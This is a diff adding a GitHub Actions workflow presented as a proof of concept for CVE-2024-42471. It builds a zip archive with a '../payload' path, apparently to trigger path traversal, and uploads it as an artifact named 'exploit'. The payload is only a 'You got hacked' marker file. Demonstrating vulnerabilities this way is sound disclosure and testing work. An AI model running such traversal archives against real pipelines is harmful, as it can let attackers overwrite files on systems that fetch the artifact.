@@ -1,0 +1,23 @@
+name: CVE-2024-42471 PoC
+
+on: [push, workflow_dispatch]
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Prepare malicious artifact
+        run: |
+          mkdir payload
+          echo "You got hacked" > payload/poc.txt
+          cd payload
+          zip -r evil.zip ../payload
+
+      - name: Upload malicious artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: exploit
+          path: payload/evil.zip
